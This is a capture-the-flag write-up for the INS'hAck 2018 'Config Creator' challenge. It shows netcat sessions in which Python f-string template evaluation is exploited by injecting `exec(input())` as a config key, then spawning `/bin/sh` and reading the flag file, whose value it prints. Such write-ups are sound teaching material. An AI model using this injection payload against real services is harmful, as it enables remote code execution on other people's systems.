# INS'hAck CTF 2018 - Config Creator
>I've just written a small utility to create a config file (which are sooo painful to write by hand, right?).
>
>Care to have a look?
>
>nc config-creator.ctf.insecurity-insa.fr 10000

That's all: no binary, no libc. Let's try to interact with the program.
```
$ nc config-creator.ctf.insecurity-insa.fr 10000
Welcome to the config creator!

Please choose your action:
  1. Register a new config entry
  2. Change value of an existing config entry
  3. Show my template
  4. Show my config
  5. Reset current config
  6. exit

Choice?
```
We are presented with a menu with several options, we can register a new config entry, edit an existing one, etc...this really looks like a typical heap exploitation challenge.

Let's explore the options and see what happens.
```
Choice? 1

Config key? test
Config value? test

Please choose your action:
  1. Register a new config entry
  2. Change value of an existing config entry
  3. Show my template
  4. Show my config
  5. Reset current config
  6. exit

Choice? 3

template:
f"""
configuration [
    test = {test};
]
"""

Please choose your action:
  1. Register a new config entry
  2. Change value of an existing config entry
  3. Show my template
  4. Show my config
  5. Reset current config
  6. exit

Choice? 4

config:

configuration [
    test = test;
]
```
First we create a couple key:value with function `1` and then we can use functions `3` and `4` to access it.

Let's try editing the config entry with function `2`.
```
Please choose your action:
  1. Register a new config entry
  2. Change value of an existing config entry
  3. Show my template
  4. Show my config
  5. Reset current config
  6. exit

Choice? 2

Config key? test
Config value? test2

Please choose your action:
  1. Register a new config entry
  2. Change value of an existing config entry
  3. Show my template
  4. Show my config
  5. Reset current config
  6. exit

Choice? 3

template:
f"""
configuration [
    test = {test};
]
"""

Please choose your action:
  1. Register a new config entry
  2. Change value of an existing config entry
  3. Show my template
  4. Show my config
  5. Reset current config
  6. exit

Choice? 4

config:

configuration [
    test = test2;
]
```
Everything as expected. What if we send an empty input?
```
Please choose your action:
  1. Register a new config entry
  2. Change value of an existing config entry
  3. Show my template
  4. Show my config
  5. Reset current config
  6. exit

Choice? 1

Config key? 
Config value? 

Please choose your action:
  1. Register a new config entry
  2. Change value of an existing config entry
  3. Show my template
  4. Show my config
  5. Reset current config
  6. exit

Choice? 3

template:
f"""
configuration [
    test = {test};
     = {};
]
"""

Please choose your action:
  1. Register a new config entry
  2. Change value of an existing config entry
  3. Show my template
  4. Show my config
  5. Reset current config
  6. exit

Choice? 4

config:
f-string: empty expression not allowed (<string>, line 6)
An error occurred, sorry
```
Uh? What's this? After a quick search we can find that this is a Python3 feature called [f-strings](https://docs.python.org/3/reference/lexical_analysis.html#f-strings).

So, why not just try inserting some Python code and see if it is executed?
```
Choice? 1

Config key? exit()
Config value? test

Please choose your action:
  1. Register a new config entry
  2. Change value of an existing config entry
  3. Show my template
  4. Show my config
  5. Reset current config
  6. exit

Choice? 3

template:
f"""
configuration [
    exit() = {exit()};
]
"""

Please choose your action:
  1. Register a new config entry
  2. Change value of an existing config entry
  3. Show my template
  4. Show my config
  5. Reset current config
  6. exit

Choice? 4

config:
$ 
```
It seems to work, the connection is closed!

If we play a little bit more with the program, we can see that some characters (like spaces, dots, underscores, quotes, etc...) are filtered out when we input the key, however round parenthesis are allowed and that's more than enough to get a shell: `exec(input())`.
```
$ nc config-creator.ctf.insecurity-insa.fr 10000
Welcome to the config creator!

Please choose your action:
  1. Register a new config entry
  2. Change value of an existing config entry
  3. Show my template
  4. Show my config
  5. Reset current config
  6. exit

Choice? 1

Config key? exec(input())  
Config value? 1337

Please choose your action:
  1. Register a new config entry
  2. Change value of an existing config entry
  3. Show my template
  4. Show my config
  5. Reset current config
  6. exit

Choice? 4

config:
__import__('os').system('/bin/sh')
id
uid=1000(config-creator) gid=1000(config-creator) groups=1000(config-creator)
ls
app.py
flag.txt
cat flag.txt
INSA{dont_get_me_wrong_i_love_python36}
```
You can find the source code of the challenge and a python exploit for it [here](https://github.com/ndaprela/CTF/tree/master/2018/INShAck2018/Config_Creator).
